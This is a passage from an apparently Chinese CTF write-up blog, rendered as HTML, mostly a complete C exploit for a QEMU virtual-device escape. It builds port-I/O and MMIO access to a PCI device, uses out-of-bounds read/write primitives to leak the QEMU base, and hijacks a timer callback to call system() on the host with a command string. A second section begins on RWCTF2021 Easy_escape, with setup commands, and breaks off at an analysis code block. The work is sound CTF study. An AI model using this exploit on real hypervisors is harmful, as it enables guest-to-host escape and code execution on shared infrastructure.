class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：获取端口访问权限。优先 ioperm(仅开本 BAR 范围)，失败回退 iopl(3) */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">acquire_io_priv</span><span class="params">(<span class="type">uint16_t</span> base, <span class="type">uint32_t</span> size,</span></span><br><span class="line"><span class="params">                           <span class="type">uint16_t</span> *grant_base, <span class="type">uint32_t</span> *grant_len,</span></span><br><span class="line"><span class="params">                           <span class="type">bool</span> *have_ioperm, <span class="type">bool</span> *have_iopl)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span>)base + len &gt; <span class="number">0x10000</span>u) len = <span class="number">0x10000</span>u - base;  <span class="comment">// 不越过 64K 上限</span></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) len = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(base, len, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        *grant_base = base;</span><br><span class="line">        *grant_len  = len;</span><br><span class="line">        *have_ioperm = <span class="literal">true</span>;</span><br><span class="line">        *have_iopl   = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        *grant_base = <span class="number">0</span>;</span><br><span class="line">        *grant_len  = <span class="number">0</span>;</span><br><span class="line">        *have_ioperm = <span class="literal">false</span>;</span><br><span class="line">        *have_iopl   = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ====== 对外 API ====== */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pio_init</span></span><br><span class="line"><span class="comment"> *   bdf_or_path : &quot;0000:bb:dd.f&quot; 形式的 BDF；或直接传 resource 的绝对路径</span></span><br><span class="line"><span class="comment"> *   bar_idx     : 0..5 指定 BAR；传 -1 自动挑选第一个 PIO BAR</span></span><br><span class="line"><span class="comment"> * 返回 0 成功，-1 失败（查看 errno）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path, <span class="type">int</span> bar_idx)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.inited) &#123; errno = EALREADY; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> base = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_io_bar(bdf_or_path, bar_idx, &amp;base, &amp;size) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> gbase = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> glen  = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> have_perm = <span class="literal">false</span>, have_iopl = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (acquire_io_priv(base, size, &amp;gbase, &amp;glen, &amp;have_perm, &amp;have_iopl) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g_pio.base       = base;</span><br><span class="line">    g_pio.size       = size;</span><br><span class="line">    g_pio.grant_base = gbase;</span><br><span class="line">    g_pio.grant_len  = glen;</span><br><span class="line">    g_pio.have_ioperm= have_perm;</span><br><span class="line">    g_pio.have_iopl  = have_iopl;</span><br><span class="line">    g_pio.inited     = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 收尾：撤销 ioperm；iopl 切回 0（可忽略失败，进程退出也会复原） */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_fini</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_ioperm) (<span class="type">void</span>)ioperm(g_pio.grant_base, g_pio.grant_len, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_iopl)   (<span class="type">void</span>)iopl(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_pio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_pio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查询已初始化的基址/大小（方便打印或检查） */</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.base; &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：计算端口号 + 越界检查 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">pio_port</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">int</span> width, <span class="type">uint16_t</span> *port_out)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited) &#123; errno = EPERM; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint64_t</span>)off + (<span class="type">uint64_t</span>)width &gt; g_pio.size) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="type">uint32_t</span> p = (<span class="type">uint32_t</span>)g_pio.base + off;</span><br><span class="line">    <span class="keyword">if</span> (p &gt; <span class="number">0xFFFF</span>u) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    *port_out = (<span class="type">uint16_t</span>)p;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读写 API —— 8/16/32 位 */</span></span><br><span class="line"><span class="type">uint8_t</span>  <span class="title function_">pio_read8</span> <span class="params">(<span class="type">uint32_t</span> off)</span> &#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">1</span>,&amp;p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> inb(p); &#125;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_read16</span><span class="params">(<span class="type">uint32_t</span> off)</span> &#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">2</span>,&amp;p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> inw(p); &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_read32</span><span class="params">(<span class="type">uint32_t</span> off)</span> &#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">4</span>,&amp;p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> inl(p); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write8</span> <span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint8_t</span>  v)</span>&#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">1</span>,&amp;p)) <span class="keyword">return</span>; outb(v,p); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write16</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint16_t</span> v)</span>&#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">2</span>,&amp;p)) <span class="keyword">return</span>; outw(v,p); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write32</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint32_t</span> v)</span>&#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">4</span>,&amp;p)) <span class="keyword">return</span>; outl(v,p); &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_MEM 0x00000200ULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *bar;   <span class="comment">// 映射后的虚拟基址</span></span><br><span class="line">    <span class="type">size_t</span>  size;            <span class="comment">// 资源真实大小（end-start+1）</span></span><br><span class="line">    <span class="type">size_t</span>  map_len;         <span class="comment">// 实际 mmap 的长度（按页对齐）</span></span><br><span class="line">    <span class="type">int</span>     fd;              <span class="comment">// 打开的 /sys/.../resourceN</span></span><br><span class="line">    <span class="type">int</span>     res_idx;         <span class="comment">// 选中的 resource 行号（BAR 号 0..5）</span></span><br><span class="line">    <span class="type">bool</span>    inited;</span><br><span class="line">&#125; <span class="type">mmio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">mmio_ctx_t</span> g_mmio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：把 BDF 或 /sys/.../resource 解析成两个路径 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_paths</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span> *resource_txt, <span class="type">size_t</span> txt_sz,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span> *dev_dir, <span class="type">size_t</span> dir_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bdf_or_path || !*bdf_or_path) &#123; errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* 直接传了 /sys/.../resource */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir,      dir_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="type">char</span> *slash = <span class="built_in">strrchr</span>(dev_dir, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!slash) &#123; errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">        *slash = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 传的是 BDF */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir,      dir_sz, <span class="string">&quot;/sys/bus/pci/devices/%s&quot;</span>,          bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：解析 resource 文本，找内存型 BAR（或指定 BAR） --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_mem_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *resource_txt, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *start,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *end,</span></span><br><span class="line"><span class="params">                         <span class="type">int</span> *picked_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(resource_txt, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, sel = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> s=<span class="number">0</span>, e=<span class="number">0</span>, f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;s, &amp;e, &amp;f) != <span class="number">3</span>) &#123; idx++; <span class="keyword">continue</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(f &amp; IORESOURCE_MEM) || e &lt; s) &#123; fclose(fp); errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                sel = idx; *start = s; *end = e; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (f &amp; IORESOURCE_MEM)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e &lt; s) &#123; fclose(fp); errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                sel = idx; *start = s; *end = e; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (sel &lt; <span class="number">0</span>) &#123; errno = ENOENT; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (picked_idx) *picked_idx = sel;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 对外：初始化 / 映射 --- */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.inited) &#123; errno = EALREADY; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> resource_txt[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> dev_dir[PATH_MAX];</span><br><span class="line">    <span class="keyword">if</span> (build_paths(bdf_or_path, resource_txt, <span class="keyword">sizeof</span>(resource_txt),</span><br><span class="line">                    dev_dir, <span class="keyword">sizeof</span>(dev_dir)) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start=<span class="number">0</span>, end=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_mem_bar(resource_txt, bar_idx, &amp;start, &amp;end, &amp;res_idx) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> size = (<span class="type">size_t</span>)((end - start) + <span class="number">1ULL</span>);</span><br><span class="line">    <span class="type">size_t</span> pg   = (<span class="type">size_t</span>)sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> map_len = (size + pg - <span class="number">1</span>) &amp; ~(pg - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> res_path[PATH_MAX];</span><br><span class="line">    <span class="built_in">snprintf</span>(res_path, <span class="keyword">sizeof</span>(res_path), <span class="string">&quot;%s/resource%d&quot;</span>, dev_dir, res_idx);</span><br><span class="line">    <span class="type">int</span> fd = open(res_path, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) &#123; <span class="type">int</span> sv = errno; close(fd); errno = sv; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    g_mmio.bar     = (<span class="keyword">volatile</span> <span class="type">uint8_t</span> *)<span class="built_in">map</span>;</span><br><span class="line">    g_mmio.size    = size;</span><br><span class="line">    g_mmio.map_len = map_len;</span><br><span class="line">    g_mmio.fd      = fd;</span><br><span class="line">    g_mmio.res_idx = res_idx;</span><br><span class="line">    g_mmio.inited  = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.bar) munmap((<span class="type">void</span> *)g_mmio.bar, g_mmio.map_len);</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.fd &gt;= <span class="number">0</span>) close(g_mmio.fd);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_mmio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_mmio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询 --- */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span> *<span class="title function_">mmio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.bar; &#125;</span><br><span class="line"><span class="type">size_t</span>         <span class="title function_">mmio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：范围检查 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">chk</span><span class="params">(<span class="type">size_t</span> off, <span class="type">size_t</span> width)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) &#123; errno = EPERM;  <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (off + width &gt; g_mmio.size) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 读写 API（按天然宽度访问；PCI 寄存器通常小端） --- */</span></span><br><span class="line"><span class="type">uint8_t</span>  <span class="title function_">mmio_read8</span> <span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">1</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span> *)(g_mmio.bar + off); &#125;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off); &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off); &#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span> <span class="params">(<span class="type">size_t</span> off, <span class="type">uint8_t</span>  v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">1</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint8_t</span> *)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint16_t</span> v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">2</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint32_t</span> v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">4</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">8</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span> *<span class="title function_">mmio_ptr</span><span class="params">(<span class="type">size_t</span> off)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off,<span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">volatile</span> <span class="type">void</span> *)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">ab_read</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    pio_write32(<span class="number">0</span>, off);</span><br><span class="line">    <span class="type">uint64_t</span> val_lo = pio_read32(<span class="number">4</span>);</span><br><span class="line">    pio_write32(<span class="number">0</span>, off + <span class="number">4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> val_hi = pio_read32(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> val_lo | val_hi &lt;&lt; <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ab_write</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    pio_write32(<span class="number">0</span>, off);</span><br><span class="line">    pio_write32(<span class="number">4</span>, val);</span><br><span class="line">    pio_write32(<span class="number">0</span>, off + <span class="number">4</span>);</span><br><span class="line">    pio_write32(<span class="number">4</span>, val &gt;&gt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    pio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    mmio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> qemu_base = ab_read(<span class="number">0x110</span>) - <span class="number">0x29ac8e</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] qemu base: %#llx\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="type">uint64_t</span> STRNGState_addr = ab_read(<span class="number">0x118</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] STRNGState_addr: %#llx\n&quot;</span>, STRNGState_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> cmd[] = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ab_write(i + <span class="number">0x14</span>, *(<span class="type">uint64_t</span>*)&amp;cmd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = qemu_base + <span class="number">0x200D50</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ab_write(<span class="number">0x110</span>, system_plt);</span><br><span class="line">    ab_write(<span class="number">0x118</span>, STRNGState_addr + <span class="number">0xaf8</span> + <span class="number">0x14</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write32(<span class="number">2</span> &lt;&lt; <span class="number">2</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// opaque-&gt;flag = 1;</span></span><br><span class="line">    pio_write32(<span class="number">0</span>, <span class="number">2</span> &lt;&lt; <span class="number">2</span>); <span class="comment">// opaque-&gt;addr &gt;&gt; 2 != 0</span></span><br><span class="line">    pio_write32(<span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// timer_mod(&amp;s-&gt;strng_timer, now + 100);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="RWCTF2021-Easy-escape"><a href="#RWCTF2021-Easy-escape" class="headerlink" title="RWCTF2021 Easy_escape"></a>RWCTF2021 Easy_escape</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) 确保启用 Universe 源并更新索引</span></span><br><span class="line"><span class="built_in">sudo</span> add-apt-repository -y universe</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 安装缺失的两个库（以及可选的 host 库）</span></span><br><span class="line"><span class="built_in">sudo</span> apt install -y libsnappy1v5 libusbredirparser1 libusbredirhost1</span><br></pre></td></tr></table></figure></div>

<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 